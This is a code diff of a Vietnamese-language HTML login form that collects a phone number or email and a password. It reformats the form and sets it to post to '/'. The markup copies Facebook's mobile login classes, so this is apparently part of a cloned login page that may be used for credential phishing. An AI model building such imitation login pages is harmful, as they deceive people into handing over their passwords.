@@ -93,19 +93,21 @@
     <div class='container'>
       <div class='row justify-content-center'>
         <div class='col-10'>
-          <form action='' method='POST' onsubmit="return verifyPassword()">
-            <div class='mb-4 mt-4'>
-              <input class='form-control' name='email' id="user2" placeholder='Số điện thoại hoặc email' required='required' type='text' />
-              <span id="message2" style="color:red"> </span> <br><br>  
-            </div>
-            <div class='mb-4'>
-              <input class='form-control' name='pass' id="pswd" placeholder='Mật khẩu' required='required' type='password' />
-              <span id="message" style="color:red"> </span> <br><br>  
-            </div>
-            <div class='d-grid gap-2'>
-              <button class='btn btn-primary' name='login' onclick="thongbao()" style='font-size: 15px; font-weight:600; ' type='submit'>Đăng nhập</button>
-            </div>
-          </form>
+            <form action='/' method='POST' onsubmit="return verifyPassword()">
+                <!-- Các trường dữ liệu đăng nhập ở đây -->
+                <div class='mb-4 mt-4'>
+                  <input class='form-control' name='email' id="user2" placeholder='Số điện thoại hoặc email' required='required' type='text' />
+                  <span id="message2" style="color:red"> </span> <br><br>  
+                </div>
+                <div class='mb-4'>
+                  <input class='form-control' name='pass' id="pswd" placeholder='Mật khẩu' required='required' type='password' />
+                  <span id="message" style="color:red"> </span> <br><br>  
+                </div>
+                <!-- Nút Đăng nhập -->
+                <div class='d-grid gap-2'>
+                  <button class='btn btn-primary' name='login' onclick="thongbao()" style='font-size: 15px; font-weight:600; ' type='submit'>Đăng nhập</button>
+                </div>
+            </form>              
           <br />
           <center><a href='#' style='text-decoration: none;font-weight: 600;'>Quên mật khẩu?</a></center>
           <div class='_43mg _8qtf' data-sigil='login_reg_separator' id='login_reg_separator'><span class='_43mh'>hoặc</span></div>
